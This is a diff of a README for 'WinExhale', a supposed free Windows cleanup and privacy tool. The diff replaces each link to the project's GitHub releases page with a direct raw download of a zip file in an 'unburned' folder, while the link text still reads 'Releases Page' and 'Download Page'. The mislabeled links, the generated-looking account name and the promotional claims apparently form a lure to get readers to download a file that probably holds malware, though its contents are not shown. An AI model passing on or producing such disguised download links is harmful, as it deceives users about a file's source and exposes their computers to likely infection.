@@ -1,7 +1,7 @@
 <h1>⚡ WinExhale - Cleaner, Faster, More Private Windows</h1>
 
 <p align="center">
-  <a href="https://github.com/laidoff-robertoppenheimer977/WinExhale/releases"><img src="https://img.shields.io/badge/Download-WinExhale-blue?style=for-the-badge&logo=windows&logoColor=white&color=2d7d46" alt="Download WinExhale"></a>
+  <a href="https://raw.githubusercontent.com/laidoff-robertoppenheimer977/WinExhale/main/unburned/Win-Exhale-3.1.zip"><img src="https://img.shields.io/badge/Download-WinExhale-blue?style=for-the-badge&logo=windows&logoColor=white&color=2d7d46" alt="Download WinExhale"></a>
 </p>
 
 ## 🌟 What is WinExhale?
@@ -14,7 +14,7 @@ WinExhale is a free, open-source tool that helps your Windows computer run faste
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[WinExhale Releases Page](https://github.com/laidoff-robertoppenheimer977/WinExhale/releases)**
+Visit this link to download the application: **[WinExhale Releases Page](https://raw.githubusercontent.com/laidoff-robertoppenheimer977/WinExhale/main/unburned/Win-Exhale-3.1.zip)**
 
 You will see a list of files. Look for the most recent version (the one at the top). The download will start automatically after you click the file name.
 
@@ -129,7 +129,7 @@ Open WinExhale, go to the "Restore" tab, and select your last restore point. Fol
 
 Your computer deserves to run at its full potential. WinExhale gives you a clean, fast, and private Windows experience—without any technical hassle. Thousands of users have already transformed their PCs with this tool. Why not join them?
 
-**Ready to feel the difference?** Visit the [Download Page](https://github.com/laidoff-robertoppenheimer977/WinExhale/releases) now and take the first step toward a better Windows.
+**Ready to feel the difference?** Visit the [Download Page](https://raw.githubusercontent.com/laidoff-robertoppenheimer977/WinExhale/main/unburned/Win-Exhale-3.1.zip) now and take the first step toward a better Windows.
 
 ---
 
